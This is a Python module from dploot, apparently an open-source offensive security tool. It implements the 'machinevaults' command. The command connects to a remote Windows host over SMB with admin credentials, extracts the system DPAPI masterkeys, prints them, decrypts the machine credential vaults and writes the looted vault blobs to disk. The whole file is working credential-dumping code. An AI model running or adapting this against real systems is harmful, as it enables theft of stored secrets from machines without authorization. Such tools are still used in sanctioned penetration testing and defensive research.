import argparse
import logging
import os
import sys
from typing import Callable, Tuple

from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target, add_target_argument_group
from dploot.lib.utils import handle_outputdir_option, parse_file_as_list

from dploot.triage.masterkeys import MasterkeysTriage
from dploot.triage.vaults import VaultsTriage


NAME = 'machinevaults'

class MachineVaultsAction:

    false_positive = ['.','..', 'desktop.ini','Public','Default','Default User','All Users']

    def __init__(self, options: argparse.Namespace) -> None:
        self.options = options

        self.target = Target(self.options)

        self.conn = None
        self._is_admin = None
        self.masterkeys = None
        self.outputdir = None

        self.outputdir = handle_outputdir_option(dir= self.options.export_vpol)

        if self.options.mkfile is not None:
            try:
                self.masterkeys = parse_file_as_list(self.options.mkfile)
            except Exception as e:
                logging.error(str(e))
                sys.exit(1)

    def connect(self) -> None:
        self.conn = DPLootSMBConnection(self.target)
        self.conn.connect()
    
    def run(self) -> None:
        self.connect()
        logging.info("Connected to %s as %s\\%s %s" % (self.target.address, self.target.domain, self.target.username, ( "(admin)"if self.is_admin  else "")))
        if self.is_admin:
            if self.masterkeys is None:
                triage = MasterkeysTriage(target=self.target, conn=self.conn)
                triage.triage_system_masterkeys()
                self.masterkeys = triage.masterkeys
                for masterkey in self.masterkeys:
                    print(masterkey)
                print()
            vaults_triage = VaultsTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys)
            vaults_triage.triage_system_vaults()
            if self.outputdir is not None:
                for filename, bytes in vaults_triage.looted_files.items():
                    with open(os.path.join(self.outputdir, filename),'wb') as outputfile:
                        outputfile.write(bytes)
            
        else:
            logging.info("Not an admin, exiting...")

    @property
    def is_admin(self) -> bool:
        if self._is_admin is not None:
            return self._is_admin

        self._is_admin = self.conn.is_admin()
        return self._is_admin

def entry(options: argparse.Namespace) -> None:
    a = MachineVaultsAction(options)
    a.run()

def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:

    subparser = subparsers.add_parser(NAME, help="Dump system vaults from remote target")

    group = subparser.add_argument_group("machinevaults options")

    group.add_argument(
        "-mkfile",
        action="store",
        help=(
            "File containing {GUID}:SHA1 masterkeys mappings"
        ),
    )

    group.add_argument(
        "-outputfile",
        action="store",
        help=(
            "Export keys to file"
        ),
    )

    group.add_argument(
        "-export-vpol",
        action="store",
        metavar="DIR_VPOL",
        help=(
            "Dump looted Vaults blob to specified directory, regardless they were decrypted"
        )
    )

    add_target_argument_group(subparser)

    return NAME, entry